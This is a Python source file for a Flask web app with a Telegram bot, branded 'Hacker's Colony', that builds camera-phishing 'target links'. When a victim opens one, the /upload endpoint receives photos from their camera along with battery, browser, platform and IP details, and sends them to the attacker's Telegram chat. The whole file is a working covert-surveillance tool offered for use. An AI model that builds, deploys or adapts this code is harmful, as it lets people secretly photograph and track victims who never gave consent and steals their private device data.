import os, base64, threading, sqlite3, time, telebot
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
TG_CHANNEL = "https://t.me/HackersColony"

bot = telebot.TeleBot(BOT_TOKEN)

bot.remove_webhook()
time.sleep(2)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Join Telegram 📢", url=TG_CHANNEL),
        types.InlineKeyboardButton("✅ I Have Joined ✅", callback_data="check_join")
    )
    bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "check_join":
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
        btn2 = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
        markup.row(btn1, btn2)
        markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
        markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
        bot.edit_message_text("<b>Select your camera mode:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)

    elif "m_" in call.data:
        mode = call.data.replace("m_", "")
        target_link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
        response_text = (
            f"🤠 It's your target link 🔗\n\n"
            f"Url = ( {target_link} )\n\n"
            f"✨ Thank you team HCO ✨"
        )
        bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    try:
        img_data = base64.b64decode(data.get('image').split(',')[1])
        info = data.get('info', {})
        caption = (f"🛡️ <b>Audit:</b> {data.get('mode').upper()}\n"
                   f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                   f"🌐 <b>Browser:</b> {info.get('browser')}\n"
                   f"📱 <b>Device:</b> {info.get('platform')}\n"
                   f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                   f"✨ Created by Roshan ✨")
        bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
    except: pass
    return jsonify({"status": "success"})

if __name__ == "__main__":
    def run_bot():
        while True:
            try: bot.polling(none_stop=True)
            except: time.sleep(10)
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
    
